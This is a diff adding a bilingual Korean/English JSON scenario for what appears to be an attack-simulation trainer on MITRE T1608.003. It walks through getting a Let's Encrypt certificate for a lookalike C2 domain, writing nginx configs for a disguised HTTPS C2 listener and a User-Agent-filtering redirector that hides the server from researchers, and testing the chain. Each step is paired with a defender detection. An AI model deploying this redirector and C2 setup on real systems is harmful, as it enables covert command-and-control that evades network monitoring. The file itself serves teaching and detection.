@@ -1,0 +1,183 @@
+{
+  "id": "T1608.003",
+  "title": "디지털 인증서 설치 시뮬레이션",
+  "titleEn": "Install Digital Certificate Simulation",
+  "duration": 10,
+  "phases": [
+    { "label": "🔍 인증서 발급", "labelEn": "🔍 Certificate Issuance", "steps": [0, 1] },
+    { "label": "⚡ C2 서버 설정", "labelEn": "⚡ C2 Server Setup", "steps": [2, 3] },
+    { "label": "✅ 통신 테스트", "labelEn": "✅ Communication Test", "steps": [4] }
+  ],
+  "topoNodes": [
+    { "id": "ext", "label": "Attacker", "x": 50, "y": 60 },
+    { "id": "le", "label": "Let's Encrypt", "x": 200, "y": 30 },
+    { "id": "c2", "label": "C2 Server", "x": 200, "y": 90 },
+    { "id": "redir", "label": "Redirector", "x": 350, "y": 60 },
+    { "id": "victim", "label": "Victim", "x": 500, "y": 60 }
+  ],
+  "topoEdges": [
+    { "from": "ext", "to": "le", "minStep": 0 },
+    { "from": "le", "to": "c2", "minStep": 1 },
+    { "from": "c2", "to": "redir", "minStep": 2 },
+    { "from": "redir", "to": "victim", "minStep": 4 }
+  ],
+  "desktopIcons": [
+    { "name": "🗑️ Recycle Bin", "icon": "🗑️" },
+    { "name": "fullchain.pem", "icon": "🔐" },
+    { "name": "nginx-c2.conf", "icon": "⚙️", "alert": true },
+    { "name": "c2_panel", "icon": "🌐" }
+  ],
+  "steps": [
+    {
+      "cmd": "certbot certonly --standalone -d cdn-analytics[.]com -d c2.cdn-analytics[.]com --non-interactive --agree-tos --email admin@protonmail.com",
+      "out": "Saving debug log to /var/log/letsencrypt/letsencrypt.log\nAccount registered.\nRequesting a certificate for cdn-analytics[.]com and c2.cdn-analytics[.]com\n\nSuccessfully received certificate.\nCertificate is saved at: /etc/letsencrypt/live/cdn-analytics[.]com/fullchain.pem\nKey is saved at:         /etc/letsencrypt/live/cdn-analytics[.]com/privkey.pem\nThis certificate expires on 2026-05-30.\n\n[+] Certificate issued for both domains\n[+] Auto-renewal configured via cron",
+      "def": "[CT Log Monitor] New certificate issued for cdn-analytics[.]com — potential C2 domain",
+      "defAction": "Source: Let's Encrypt CT Log\nTarget: cdn-analytics[.]com\nAction: Domain added to threat watch list, CT log alert configured",
+      "desc": "C2 도메인에 Let's Encrypt 인증서를 자동 발급받습니다.",
+      "descEn": "Auto-provisioning Let's Encrypt certificate for C2 domain.",
+      "stepTitle": "C2 도메인 인증서 발급",
+      "stepTitleEn": "C2 Domain Certificate Issuance",
+      "feynman": "가짜 가게에 '사업자등록증'을 발급받는 것입니다. Let's Encrypt는 도메인 소유만 확인하면 무료로 인증서를 발급해줍니다. cdn-analytics.com이라는 CDN 분석 서비스처럼 보이는 도메인에 합법 인증서를 받으면 브라우저에서 자물쇠가 표시됩니다.",
+      "feynmanEn": "Like getting a business license for a fake store. Let's Encrypt issues free certificates with domain ownership verification only. Getting a legitimate certificate for cdn-analytics.com makes browsers show a lock icon.",
+      "expert": "Let's Encrypt의 ACME HTTP-01 챌린지는 자동화가 가능합니다. SAN에 c2 서브도메인을 포함하면 하나의 인증서로 리다이렉터와 C2 서버를 모두 커버합니다.",
+      "expertEn": "Let's Encrypt ACME HTTP-01 challenge is automatable. Including c2 subdomain in SAN covers both redirector and C2 server with a single certificate.",
+      "defTooltip": "🔗 CT 로그: C2 의심 도메인 인증서 발급 감지",
+      "defTooltipEn": "🔗 CT Log: Certificate issuance for suspected C2 domain detected",
+      "hackerLog": {
+        "title": "cert_issue.log",
+        "lines": [
+          { "log": "Domain: cdn-analytics[.]com", "desc": "💡 CDN 분석 서비스처럼 위장한 C2 도메인" },
+          { "log": "SAN: c2.cdn-analytics[.]com", "desc": "💡 서브도메인까지 포함 — 다중 서버 커버" },
+          { "log": "Issuer: Let's Encrypt (FREE)", "desc": "💡 무료 자동 발급 — 추적 어려움" }
+        ]
+      },
+      "terms": [
+        { "name": "ACME", "desc": "Automatic Certificate Management Environment. Let's Encrypt가 사용하는 인증서 자동 발급 프로토콜." },
+        { "name": "SAN", "desc": "Subject Alternative Name. 하나의 인증서에 여러 도메인을 포함하는 X.509 확장." }
+      ]
+    },
+    {
+      "cmd": "cat > /etc/nginx/conf.d/c2-https.conf << 'CONF'\nserver {\n    listen 443 ssl http2;\n    server_name cdn-analytics[.]com;\n    ssl_certificate /etc/letsencrypt/live/cdn-analytics[.]com/fullchain.pem;\n    ssl_certificate_key /etc/letsencrypt/live/cdn-analytics[.]com/privkey.pem;\n    ssl_protocols TLSv1.2 TLSv1.3;\n    ssl_session_tickets off;\n    add_header Strict-Transport-Security \"max-age=31536000\" always;\n    location /api/telemetry { proxy_pass http://127.0.0.1:50050; }\n    location / { return 200 '{\"service\":\"analytics\",\"version\":\"2.1\"}'; add_header Content-Type application/json; }\n}\nCONF\nnginx -t && systemctl reload nginx && echo '[+] HTTPS C2 listener active'",
+      "out": "nginx: the configuration file /etc/nginx/nginx.conf syntax is ok\nnginx: configuration file /etc/nginx/nginx.conf test is successful\n[+] HTTPS C2 listener active\n\n$ curl -s https://cdn-analytics[.]com/\n{\"service\":\"analytics\",\"version\":\"2.1\"}\n\n$ curl -sI https://cdn-analytics[.]com/ | grep -i strict\nStrict-Transport-Security: max-age=31536000",
+      "def": "[Network] New HTTPS service on cdn-analytics[.]com — returns minimal JSON, potential C2 front",
+      "defAction": "Source: cdn-analytics[.]com:443\nTarget: Network monitoring\nAction: Domain behavior profiling initiated, traffic pattern analysis started",
+      "desc": "Nginx에 인증서를 설치하고 HTTPS C2 리스너를 구성합니다.",
+      "descEn": "Installing certificate on Nginx and configuring HTTPS C2 listener.",
+      "stepTitle": "Nginx HTTPS C2 리스너 구성",
+      "stepTitleEn": "Nginx HTTPS C2 Listener Configuration",
+      "feynman": "가짜 가게에 보안 문과 금고를 설치하는 것입니다. Nginx 웹서버에 SSL 인증서를 설치하면 모든 통신이 암호화됩니다. /api/telemetry 경로만 C2 서버로 연결하고, 다른 경로는 정상 API처럼 JSON을 반환합니다.",
+      "feynmanEn": "Like installing security doors and a vault in a fake store. Installing SSL certificate on Nginx encrypts all communications. Only /api/telemetry connects to C2, while other paths return normal-looking JSON.",
+      "expert": "HSTS 헤더와 TLS 1.2/1.3만 허용하는 설정은 합법적인 보안 구성을 모방합니다. 루트 경로의 JSON 응답은 자동 스캐너에게 정상 API 서비스로 보이게 합니다.",
+      "expertEn": "HSTS headers and TLS 1.2/1.3 only configuration mimic legitimate security settings. Root path JSON response makes automated scanners see a normal API service.",
+      "defTooltip": "🔗 네트워크: 최소 JSON 반환하는 새 HTTPS 서비스 — C2 프론트 가능성",
+      "defTooltipEn": "🔗 Network: New HTTPS service returning minimal JSON — potential C2 front",
+      "hackerLog": {
+        "title": "c2_listener.log",
+        "lines": [
+          { "log": "Listener: cdn-analytics[.]com:443", "desc": "💡 HTTPS C2 리스너 활성화" },
+          { "log": "C2 path: /api/telemetry", "desc": "💡 텔레메트리 API로 위장한 C2 엔드포인트" },
+          { "log": "HSTS: enabled (31536000s)", "desc": "💡 합법 사이트처럼 보안 헤더 설정" }
+        ]
+      },
+      "terms": [
+        { "name": "HSTS", "desc": "HTTP Strict Transport Security. 브라우저에게 항상 HTTPS로 접속하도록 강제하는 보안 헤더." },
+        { "name": "리버스 프록시", "desc": "외부 요청을 내부 서버로 전달하는 중간 서버. C2 서버를 숨기는 데 활용." }
+      ]
+    },
+    {
+      "cmd": "cat > /etc/nginx/conf.d/redirector.conf << 'CONF'\nserver {\n    listen 443 ssl http2;\n    server_name updates.cdn-analytics[.]com;\n    ssl_certificate /etc/letsencrypt/live/cdn-analytics[.]com/fullchain.pem;\n    ssl_certificate_key /etc/letsencrypt/live/cdn-analytics[.]com/privkey.pem;\n    \n    # Only forward valid C2 beacons\n    location /api/telemetry {\n        if ($http_user_agent !~* 'Mozilla/5.0.*Windows NT 10') { return 404; }\n        proxy_pass https://c2.cdn-analytics[.]com;\n        proxy_ssl_verify off;\n    }\n    # Block all other requests\n    location / { return 301 https://www.google.com; }\n}\nCONF\nnginx -t && systemctl reload nginx",
+      "out": "nginx: the configuration file /etc/nginx/nginx.conf syntax is ok\nnginx: configuration file /etc/nginx/nginx.conf test is successful\n\n[+] Redirector configured on updates.cdn-analytics[.]com\n[+] Rules:\n    - Valid C2 beacon (Windows UA) → Forward to C2 server\n    - Invalid request (scanner/researcher) → Redirect to google.com\n    - Direct access without beacon headers → 404\n\n[+] Redirector protects C2 server IP from discovery",
+      "def": "[Threat Intel] Redirector pattern detected — conditional forwarding based on User-Agent string",
+      "defAction": "Source: updates.cdn-analytics[.]com\nTarget: Redirector analysis\nAction: Redirector chain mapped, C2 infrastructure documented",
+      "desc": "C2 리다이렉터를 구성하여 유효한 비콘만 C2 서버로 전달하고, 보안 연구자의 접근을 차단합니다.",
+      "descEn": "Configuring C2 redirector to forward only valid beacons to C2 server, blocking security researchers.",
+      "stepTitle": "C2 리다이렉터 구성",
+      "stepTitleEn": "C2 Redirector Configuration",
+      "feynman": "가짜 가게 앞에 '경비원'을 세우는 것입니다. 리다이렉터는 방문자를 검사하여, 올바른 비밀번호(User-Agent)를 가진 사람만 진짜 C2 서버로 안내합니다. 보안 연구자나 스캐너는 Google로 리다이렉트되어 C2 서버의 존재를 파악할 수 없습니다.",
+      "feynmanEn": "Like placing a guard in front of a fake store. The redirector inspects visitors, only guiding those with the correct password (User-Agent) to the real C2 server. Security researchers or scanners are redirected to Google.",
+      "expert": "User-Agent 기반 필터링은 가장 기본적인 리다이렉터 규칙입니다. 실전에서는 JA3 핑거프린트, 쿠키, 커스텀 헤더 등 다중 조건을 사용합니다.",
+      "expertEn": "User-Agent based filtering is the most basic redirector rule. In practice, multiple conditions like JA3 fingerprint, cookies, and custom headers are used.",
+      "defTooltip": "🔗 위협 인텔: User-Agent 기반 조건부 포워딩 리다이렉터 감지",
+      "defTooltipEn": "🔗 Threat Intel: Conditional forwarding redirector based on User-Agent detected",
+      "hackerLog": {
+        "title": "redirector.log",
+        "lines": [
+          { "log": "Valid beacon → C2 server", "desc": "💡 올바른 UA 헤더만 C2로 전달" },
+          { "log": "Scanner/researcher → google.com", "desc": "💡 보안 분석가 접근 차단" },
+          { "log": "Direct access → 404", "desc": "💡 C2 서버 IP 노출 방지" }
+        ]
+      },
+      "terms": [
+        { "name": "리다이렉터", "desc": "C2 서버 앞에 위치하여 유효한 트래픽만 전달하는 프록시 서버. C2 서버 보호 목적." },
+        { "name": "User-Agent 필터링", "desc": "HTTP 요청의 UA 헤더를 검사하여 특정 클라이언트만 허용하는 접근 제어 기법." }
+      ]
+    },
+    {
+      "cmd": "echo | openssl s_client -connect cdn-analytics[.]com:443 2>/dev/null | openssl x509 -noout -subject -issuer -dates -fingerprint -sha256 && echo '---' && curl -s 'https://crt.sh/?q=cdn-analytics.com&output=json' | jq '.[0] | {id, issuer_name, not_before, not_after}'",
+      "out": "subject=CN = cdn-analytics[.]com\nissuer=CN = R3, O = Let's Encrypt, C = US\nnotBefore=Mar  1 00:00:00 2026 GMT\nnotAfter=May 30 23:59:59 2026 GMT\nSHA256 Fingerprint=AB:CD:EF:12:34:56:78:9A:BC:DE:F0:12:34:56:78:9A:AB:CD:EF:12:34:56:78:9A:BC:DE:F0:12:34:56:78:9A\n---\n{\n  \"id\": 12345678901,\n  \"issuer_name\": \"C=US, O=Let's Encrypt, CN=R3\",\n  \"not_before\": \"2026-03-01T00:00:00\",\n  \"not_after\": \"2026-05-30T23:59:59\"\n}",
+      "def": "[CT Monitor] Certificate for cdn-analytics[.]com found in CT log — domain age < 7 days",
+      "defAction": "Source: crt.sh CT log search\nTarget: cdn-analytics[.]com certificate\nAction: New domain + new certificate correlation alert",
+      "desc": "설치된 인증서의 유효성과 CT 로그 노출을 확인합니다.",
+      "descEn": "Verifying installed certificate validity and CT log exposure.",
+      "stepTitle": "인증서 검증 및 CT 로그 확인",
+      "stepTitleEn": "Certificate Verification and CT Log Check",
+      "feynman": "발급받은 사업자등록증이 유효한지, 그리고 공공 기록에 남았는지 확인하는 것입니다. crt.sh에서 인증서 발급 기록을 조회하면 CT(Certificate Transparency) 로그에 기록된 것을 확인할 수 있습니다. 방어자도 이 로그를 모니터링하여 의심 도메인을 탐지할 수 있습니다.",
+      "feynmanEn": "Like verifying a business license is valid and checking if it appears in public records. Querying crt.sh shows the certificate is recorded in CT logs. Defenders can also monitor these logs to detect suspicious domains.",
+      "expert": "CT 로그는 양날의 검입니다. 인증서 투명성을 높이지만, 공격자의 인프라 인증서도 노출됩니다. 방어자는 CT 로그를 모니터링하여 유사 도메인 인증서 발급을 조기 탐지할 수 있습니다.",
+      "expertEn": "CT logs are a double-edged sword. They increase certificate transparency but also expose attacker infrastructure certificates. Defenders can monitor CT logs for early detection of lookalike domain certificates.",
+      "defTooltip": "🔗 CT 모니터: 신규 도메인(7일 미만)의 인증서 발급 감지",
+      "defTooltipEn": "🔗 CT Monitor: Certificate issuance for new domain (< 7 days) detected",
+      "hackerLog": {
+        "title": "cert_verify.log",
+        "lines": [
+          { "log": "Valid: 2026-03-01 ~ 2026-05-30", "desc": "💡 3개월 유효기간 — Let's Encrypt 기본값" },
+          { "log": "CT Log: Recorded (crt.sh)", "desc": "💡 공개 CT 로그에 기록 — 방어자도 조회 가능" },
+          { "log": "SHA256: AB:CD:EF:12...", "desc": "💡 인증서 핑거프린트 — IOC로 활용 가능" }
+        ]
+      },
+      "terms": [
+        { "name": "crt.sh", "desc": "Certificate Transparency 로그를 검색할 수 있는 무료 서비스. 인증서 발급 내역 조회." },
+        { "name": "인증서 핑거프린트", "desc": "인증서의 SHA-256 해시. IOC(침해지표)로 활용하여 악성 인증서를 탐지." }
+      ]
+    },
+    {
+      "cmd": "python3 -c \"\nprint('[*] End-to-end C2 communication test')\nprint()\nprint('[1] Beacon → Redirector (updates.cdn-analytics[.]com:443)')\nprint('    TLS: Valid Let\\\"s Encrypt certificate')\nprint('    UA check: PASS (Windows 10 Mozilla UA)')\nprint('    Result: Forwarded to C2')\nprint()\nprint('[2] Redirector → C2 (c2.cdn-analytics[.]com:443)')\nprint('    TLS: Same wildcard cert')\nprint('    Path: /api/telemetry')\nprint('    Result: C2 response received')\nprint()\nprint('[3] C2 Response')\nprint('    Sleep: 60s, Jitter: 25%')\nprint('    Tasks: 0 (standby mode)')\nprint('    Encrypted: AES-256 inside TLS')\nprint()\nprint('[✅] Full chain operational')\nprint('[✅] All TLS connections valid — no certificate warnings')\nprint('[✅] Network IDS cannot inspect encrypted payload')\n\"",
+      "out": "[*] End-to-end C2 communication test\n\n[1] Beacon → Redirector (updates.cdn-analytics[.]com:443)\n    TLS: Valid Let's Encrypt certificate\n    UA check: PASS (Windows 10 Mozilla UA)\n    Result: Forwarded to C2\n\n[2] Redirector → C2 (c2.cdn-analytics[.]com:443)\n    TLS: Same wildcard cert\n    Path: /api/telemetry\n    Result: C2 response received\n\n[3] C2 Response\n    Sleep: 60s, Jitter: 25%\n    Tasks: 0 (standby mode)\n    Encrypted: AES-256 inside TLS\n\n[✅] Full chain operational\n[✅] All TLS connections valid — no certificate warnings\n[✅] Network IDS cannot inspect encrypted payload",
+      "def": "[SIEM] Periodic HTTPS connections to newly registered domain with consistent beacon pattern detected",
+      "defAction": "Source: Internal host → updates.cdn-analytics[.]com\nTarget: C2 communication chain\nAction: TLS inspection enabled, beacon pattern correlated, host isolated for investigation",
+      "desc": "인증서가 설치된 전체 C2 통신 체인을 테스트합니다. TLS 암호화로 네트워크 검사를 우회합니다.",
+      "descEn": "Testing the complete C2 communication chain with installed certificates. TLS encryption bypasses network inspection.",
+      "stepTitle": "전체 C2 체인 테스트",
+      "stepTitleEn": "Full C2 Chain Test",
+      "feynman": "가짜 가게의 전체 운영 시스템을 최종 점검하는 것입니다. 감염된 컴퓨터(Beacon)에서 경비원(Redirector)을 거쳐 본부(C2 서버)까지 암호화된 통신이 정상 작동하는지 확인합니다. 모든 구간이 유효한 SSL 인증서로 보호되어 네트워크 보안 장비가 내용을 볼 수 없습니다.",
+      "feynmanEn": "Like doing final inspection of the entire fake store operation system. Verifying encrypted communication works from infected computer (Beacon) through guard (Redirector) to headquarters (C2 server). All segments protected by valid SSL certificates, invisible to network security.",
+      "expert": "이중 암호화(AES-256 페이로드 inside TLS 터널)는 TLS 인터셉션이 적용되어도 C2 명령을 보호합니다. 60초 수면 + 25% 지터는 정상 트래픽 패턴을 모방합니다.",
+      "expertEn": "Double encryption (AES-256 payload inside TLS tunnel) protects C2 commands even with TLS interception. 60-second sleep + 25% jitter mimics normal traffic patterns.",
+      "defTooltip": "🔗 SIEM: 신규 도메인으로의 주기적 HTTPS 비콘 패턴 탐지",
+      "defTooltipEn": "🔗 SIEM: Periodic HTTPS beacon pattern to newly registered domain detected",
+      "hackerLog": {
+        "title": "chain_test.log",
+        "lines": [
+          { "log": "Chain: Beacon → Redirector → C2", "desc": "💡 3단 구성 — C2 서버 IP 완전 보호" },
+          { "log": "Encryption: AES-256 inside TLS", "desc": "💡 이중 암호화 — TLS 인터셉션으로도 해독 불가" },
+          { "log": "IDS: Cannot inspect payload", "desc": "💡 유효 인증서 + 암호화 = 네트워크 탐지 우회" }
+        ]
+      },
+      "terms": [
+        { "name": "이중 암호화", "desc": "TLS 터널 안에 추가 암호화 계층을 적용하여 TLS 인터셉션 환경에서도 데이터를 보호하는 기법." },
+        { "name": "Jitter", "desc": "비콘 간격에 랜덤 변동을 추가하여 주기적 패턴 탐지를 회피하는 기법." }
+      ]
+    }
+  ],
+  "processTree": [
+    { "pid": 1, "name": "init", "children": [
+      { "pid": 1200, "name": "bash", "children": [
+        { "pid": 1201, "name": "certbot (cert issuance)", "children": [] },
+        { "pid": 1205, "name": "nginx (C2 listener)", "children": [] },
+        { "pid": 1210, "name": "nginx (redirector)", "children": [] },
+        { "pid": 1215, "name": "openssl (verification)", "children": [] },
+        { "pid": 1220, "name": "chain test", "children": [] }
+      ]}
+    ]}
+  ]
+}
